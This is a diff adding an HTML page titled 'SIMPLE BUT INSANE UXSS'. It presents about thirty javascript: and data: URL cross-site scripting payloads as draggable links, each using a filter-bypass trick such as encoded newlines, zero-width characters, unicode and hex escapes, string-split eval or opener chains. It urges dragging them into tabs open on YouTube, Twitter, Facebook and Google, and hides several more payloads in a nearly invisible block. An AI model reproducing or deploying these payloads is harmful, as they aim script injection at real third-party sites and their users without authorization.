@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>🚀 SIMPLE BUT INSANE UXSS</title>
+    <style>
+        body {
+            background: linear-gradient(45deg, #000, #111);
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            margin: 0;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        h1 {
+            color: #f0f;
+            text-align: center;
+            font-size: 2.5em;
+            text-shadow: 0 0 10px #ff00ff;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #0ff;
+            margin-bottom: 40px;
+            font-size: 1.2em;
+        }
+        
+        .drag-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 30px;
+        }
+        
+        .drag-box {
+            background: rgba(0, 20, 40, 0.8);
+            border: 2px solid;
+            padding: 25px;
+            border-radius: 10px;
+            cursor: grab;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+            min-height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+        
+        .drag-box:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px currentColor;
+        }
+        
+        .drag-content {
+            font-size: 1.2em;
+            font-weight: bold;
+            pointer-events: none;
+        }
+        
+        .box-1 { border-color: #ff0000; color: #ff0000; }
+        .box-2 { border-color: #00ff00; color: #00ff00; }
+        .box-3 { border-color: #0000ff; color: #0000ff; }
+        .box-4 { border-color: #ffff00; color: #ffff00; }
+        .box-5 { border-color: #ff00ff; color: #ff00ff; }
+        .box-6 { border-color: #00ffff; color: #00ffff; }
+        .box-7 { border-color: #ff8800; color: #ff8800; }
+        .box-8 { border-color: #8800ff; color: #8800ff; }
+        
+        .code {
+            background: #000;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+            font-family: 'Consolas', monospace;
+            font-size: 0.9em;
+            overflow-x: auto;
+            white-space: nowrap;
+        }
+        
+        .insane-tip {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #f00;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            color: #ff6666;
+        }
+        
+        .instructions {
+            background: rgba(0, 100, 255, 0.1);
+            border: 1px solid #00aaff;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            color: #66ccff;
+        }
+        
+        .fire {
+            animation: fire 0.5s infinite alternate;
+        }
+        
+        @keyframes fire {
+            from { text-shadow: 0 0 5px #ff0000, 0 0 10px #ff0000; }
+            to { text-shadow: 0 0 10px #ff8800, 0 0 20px #ff8800; }
+        }
+        
+        .glitch {
+            animation: glitch 0.3s infinite;
+        }
+        
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="fire">🔥 SIMPLE BUT INSANE UXSS 🔥</h1>
+        <div class="subtitle glitch">Drag these to another tab's address bar and watch magic happen</div>
+        
+        <div class="insane-tip">
+            💀 PRO TIP: Open YouTube.com in another tab, then drag these there!
+        </div>
+        
+        <div class="drag-grid">
+            
+            <!-- Technique 1: Basic but encoded -->
+            <a href="javascript:/*%0a*/alert/*%0a*/(/*%0a*/document.domain/*%0a*/)/*%0a*/;//">
+                <div class="drag-box box-1">
+                    <div class="drag-content">
+                        🚀 Drag Me #1<br>
+                        <small>Comment bypass</small>
+                    </div>
+                </div>
+            </a>
+            
+            <!-- Technique 2: Unicode madness -->
+            <a href="javascript://%E2%80%8B%E2%80%8C%E2%80%8D%E2%80%8E%E2%80%8Falert(document.domain);//">
+                <div class="drag-box box-2">
+                    <div class="drag-content">
+                        🌈 Drag Me #2<br>
+                        <small>Zero-width chars</small>
+                    </div>
+                </div>
+            </a>
+            
+            <!-- Technique 3: Template literal fun -->
+            <a href="javascript:alert`${document.domain}`;//">
+                <div class="drag-box box-3">
+                    <div class="drag-content">
+                        💥 Drag Me #3<br>
+                        <small>Template literals</small>
+                    </div>
+                </div>
+            </a>
+            
+            <!-- Technique 4: With keyword -->
+            <a href="javascript:with(document)alert(domain);//">
+                <div class="drag-box box-4">
+                    <div class="drag-content">
+                        ⚡ Drag Me #4<br>
+                        <small>with statement</small>
+                    </div>
+                </div>
+            </a>
+            
+            <!-- Technique 5: Indirect eval -->
+            <a href="javascript:window['alert'](document['domain']);//">
+                <div class="drag-box box-5">
+                    <div class="drag-content">
+                        🔥 Drag Me #5<br>
+                        <small>Bracket notation</small>
+                    </div>
+                </div>
+            </a>
+            
+            <!-- Technique 6: Location hack -->
+            <a href="javascript:location='javascript:alert(parent.document.domain)';//">
+                <div class="drag-box box-6">
+                    <div class="drag-content">
+                        🌪️ Drag Me #6<br>
+                        <small>Location redirect</small>
+                    </div>
+                </div>
+            </a>
+            
+            <!-- Technique 7: Data URI chain -->
+            <a href="data:text/html,<script>alert(opener.document.domain)</script>">
+                <div class="drag-box box-7">
+                    <div class="drag-content">
+                        🌀 Drag Me #7<br>
+                        <small>Data URI opener</small>
+                    </div>
+                </div>
+            </a>
+            
+            <!-- Technique 8: Double javascript: -->
+            <a href="javascript:javascript:alert(document.domain);//">
+                <div class="drag-box box-8">
+                    <div class="drag-content">
+                        💀 Drag Me #8<br>
+                        <small>Double javascript:</small>
+                    </div>
+                </div>
+            </a>
+            
+        </div>
+        
+        <!-- More insane techniques in code blocks -->
+        <div class="instructions">
+            📋 <strong>How to use:</strong><br>
+            1. Open another tab (like youtube.com)<br>
+            2. Drag any colored box to THAT tab's address bar<br>
+            3. Press Enter or drop it<br>
+            4. Watch XSS execute in THAT tab's context!
+        </div>
+        
+        <h2>🚀 EVEN MORE INSANE TECHNIQUES:</h2>
+        
+        <!-- Hidden crazy techniques -->
+        <div class="code">
+            // 9. Backtick and newline madness<br>
+            <a href="javascript:alert`${document.domain}`" style="color:#0ff;">↪ DRAG THIS: javascript:alert`${document.domain}`</a>
+        </div>
+        
+        <div class="code">
+            // 10. HTML entities in javascript:<br>
+            <a href="javascript:alert&#40;document.domain&#41;;//" style="color:#ff0;">↪ DRAG THIS: javascript:alert&#40;document.domain&#41;;//</a>
+        </div>
+        
+        <div class="code">
+            // 11. Using void and comma operator<br>
+            <a href="javascript:void alert(document.domain),1;//" style="color:#f0f;">↪ DRAG THIS: javascript:void alert(document.domain),1;//</a>
+        </div>
+        
+        <div class="code">
+            // 12. Unicode escape sequences<br>
+            <a href="javascript:\u0061\u006c\u0065\u0072\u0074(document.domain);//" style="color:#0f0;">↪ DRAG THIS: javascript:\u0061\u006c\u0065\u0072\u0074(document.domain);//</a>
+        </div>
+        
+        <div class="code">
+            // 13. Nested javascript: protocols<br>
+            <a href="javascript:location='javAscript:alErt(document.domain)';//" style="color:#ff8800;">↪ DRAG THIS: javascript:location='javAscript:alErt(document.domain)';//</a>
+        </div>
+        
+        <div class="code">
+            // 14. Using import()<br>
+            <a href="javascript:import('data:text/javascript,alert(document.domain)');//" style="color:#00ffff;">↪ DRAG THIS: javascript:import('data:text/javascript,alert(document.domain)');//</a>
+        </div>
+        
+        <div class="code">
+            // 15. Function constructor<br>
+            <a href="javascript:Function('ale'+'rt(do'+'cument.dom'+'ain)')();//" style="color:#ff4444;">↪ DRAG THIS: javascript:Function('ale'+'rt(do'+'cument.dom'+'ain)')();//</a>
+        </div>
+        
+        <div class="code">
+            // 16. setTimeout with 0 delay<br>
+            <a href="javascript:setTimeout('alert(document.domain)',0);//" style="color:#8844ff;">↪ DRAG THIS: javascript:setTimeout('alert(document.domain)',0);//</a>
+        </div>
+        
+        <div class="code">
+            // 17. document.write injection<br>
+            <a href="javascript:document.write('<script>alert(document.domain)</script>');//" style="color:#44ff88;">↪ DRAG THIS: javascript:document.write('&lt;script&gt;alert(document.domain)&lt;/script&gt;');//</a>
+        </div>
+        
+        <div class="code">
+            // 18. Using name property<br>
+            <a href="javascript:name='alert(document.domain)';eval(name);//" style="color:#ff8844;">↪ DRAG THIS: javascript:name='alert(document.domain)';eval(name);//</a>
+        </div>
+        
+        <div class="code">
+            // 19. Base64 encoded via data: URI<br>
+            <a href="data:text/html;base64,PHNjcmlwdD5hbGVydChvcGVuZXIuZG9jdW1lbnQuZG9tYWluKTwvc2NyaXB0Pg==" style="color:#ff44ff;">↪ DRAG THIS: data:text/html;base64,PHNjcmlwdD5hbGVydChvcGVuZXIuZG9jdW1lbnQuZG9tYWluKTwvc2NyaXB0Pg==</a>
+        </div>
+        
+        <div class="code">
+            // 20. The ultimate chain<br>
+            <a href="javascript:location='data:text/html,<script>opener.eval(\"alert(document.domain)\")</script>';//" style="color:#ffff00;">↪ DRAG THIS: javascript:location='data:text/html,&lt;script&gt;opener.eval("alert(document.domain)")&lt;/script&gt;';//</a>
+        </div>
+        
+        <h2>💀 CRAZY COMBINATIONS:</h2>
+        
+        <div class="code">
+            // Combination 1: Unicode + Template + Eval<br>
+            <a href="javascript://\u000aeval`\u0061\u006c\u0065\u0072\u0074\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x29`" style="color:#ff0000;">↪ ULTIMATE: Unicode+Eval+Hex</a>
+        </div>
+        
+        <div class="code">
+            // Combination 2: Everything at once<br>
+            <a href="javascript:/*\u000a*/with(/*\u000a*/window/*\u000a*/)/* \u000a*/eval/*\u000a*/(/*\u000a*/'ale'+'rt'+'('+'do'+'cument.dom'+'ain'+')'/*\u000a*/)/* \u000a*/;//\u000a" style="color:#00ff00;">↪ MEGA BYPASS: All techniques combined</a>
+        </div>
+        
+        <div class="insane-tip">
+            🔥 <strong>INSANE IDEA:</strong> Try dragging these while having DevTools open on the target tab!<br>
+            Some browsers might handle drag-and-drop differently when DevTools is active.
+        </div>
+        
+        <h2>🎯 TEST THESE ON:</h2>
+        <div class="code">
+            • YouTube.com<br>
+            • Twitter.com<br>
+            • Facebook.com<br>
+            • Google.com<br>
+            • Any site you want to test!
+        </div>
+        
+        <div style="text-align: center; margin-top: 40px; padding: 20px; border-top: 2px solid #f0f;">
+            <p style="color: #888;">💡 These are SIMPLE javascript: URLs but with creative bypass techniques</p>
+            <p style="color: #f00;">⚠️ For educational and authorized testing only!</p>
+            <p style="color: #0ff;">Modern browsers block most of these, but you might get lucky with older versions</p>
+        </div>
+        
+        <!-- Hidden surprise techniques -->
+        <div style="opacity: 0.1; position: absolute; top: 0; left: 0;">
+            <!-- Secret technique: Using onerror handler -->
+            <a href="javascript:document.body.innerHTML='<img src=x onerror=alert(document.domain)>';//">Secret 1</a>
+            
+            <!-- Secret technique: Using import() with dynamic import -->
+            <a href="javascript:import(`data:text/javascript,alert(document.domain)`);//">Secret 2</a>
+            
+            <!-- Secret technique: Using console trick -->
+            <a href="javascript:console.log(document.domain);alert=console.log;alert(document.domain);//">Secret 3</a>
+            
+            <!-- Secret technique: Abusing about:blank -->
+            <a href="about:blank#javascript:alert(document.domain)">Secret 4</a>
+            
+            <!-- Secret technique: Using performance.now() timing -->
+            <a href="javascript:eval('al'+'ert(per'+'formance.now()+document.domain)');//">Secret 5</a>
+        </div>
+    </div>
+
+    <script>
+        // Add some interactive effects
+        document.querySelectorAll('.drag-box').forEach(box => {
+            box.addEventListener('dragstart', function(e) {
+                this.style.opacity = '0.5';
+                this.style.transform = 'scale(1.1)';
+                
+                // Also set some dataTransfer for fun
+                e.dataTransfer.setData('text/plain', '🚀 DRAGGING UXSS PAYLOAD 🚀');
+                e.dataTransfer.setData('text/uri-list', this.parentElement.href);
+                
+                console.log('Dragging: ', this.parentElement.href);
+            });
+            
+            box.addEventListener('dragend', function(e) {
+                this.style.opacity = '1';
+                this.style.transform = 'scale(1)';
+                console.log('Dropped UXSS payload somewhere!');
+            });
+        });
+        
+        // Easter egg: If you drag 5 times, show secret
+        let dragCount = 0;
+        document.addEventListener('dragstart', () => {
+            dragCount++;
+            if(dragCount === 5) {
+                alert('🎉 You found the drag master! Try dragging to about:blank in another tab!');
+            }
+        });
+        
+        // Log all techniques to console
+        console.log('%c🔥 INSANE UXSS TECHNIQUES LOADED 🔥', 'color: #ff0000; font-size: 20px; font-weight: bold;');
+        console.log('%c1. Comment bypass: javascript:/*%0a*/alert/*%0a*/(/*%0a*/document.domain/*%0a*/)/*%0a*/;//', 'color: #ff8800');
+        console.log('%c2. Unicode madness: javascript://%E2%80%8B%E2%80%8C%E2%80%8D%E2%80%8E%E2%80%8Falert(document.domain);//', 'color: #00ff00');
+        console.log('%c3. Template literal: javascript:alert`${document.domain}`;//', 'color: #0088ff');
+        console.log('%c4. With keyword: javascript:with(document)alert(domain);//', 'color: #ff00ff');
+        console.log('%c5. Bracket notation: javascript:window[\'alert\'](document[\'domain\']);//', 'color: #ffff00');
+        console.log('%c%cDRAG THESE TO ANOTHER TAB\'S ADDRESS BAR!', 'color: #ffffff; font-size: 14px;', 'color: #ff0000; font-size: 16px; font-weight: bold;');
+    </script>
+</body>
+</html>
